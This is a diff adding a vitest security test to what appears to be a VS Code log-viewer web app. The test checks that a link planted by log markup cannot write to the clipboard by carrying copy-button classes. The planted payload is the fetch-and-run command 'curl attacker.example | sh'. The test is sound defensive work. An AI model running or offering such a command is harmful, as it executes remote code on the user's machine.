@@ -115,3 +115,38 @@ describe("outside VS Code", () => {
     expect(invalidateLogListing).not.toHaveBeenCalled();
   });
 });
+
+describe("log-authored markup", () => {
+  // jsdom has no clipboard; a delegate-based copier falls back to
+  // document.execCommand("copy"), which is the observable we deny.
+  const execCommand = vi.fn(() => true);
+  // What a sanitized MathJax \href payload can plant in the DOM.
+  const planted = document.createElement("a");
+  planted.className = "copy-button";
+  planted.setAttribute("data-clipboard-text", "curl attacker.example | sh");
+  planted.textContent = "harmless-looking link";
+
+  beforeEach(() => {
+    Object.defineProperty(document, "execCommand", {
+      value: execCommand,
+      configurable: true,
+    });
+    document.body.appendChild(planted);
+  });
+  afterEach(() => {
+    planted.remove();
+    // jsdom defines no execCommand, so restoring means removing the property.
+    delete (document as Partial<Document>).execCommand;
+  });
+
+  it("cannot trigger a clipboard write by carrying copy-button classes", () => {
+    vi.mocked(getVscodeApi).mockReturnValue(undefined);
+    render(<AppContent />);
+
+    act(() => {
+      planted.click();
+    });
+
+    expect(execCommand).not.toHaveBeenCalled();
+  });
+});
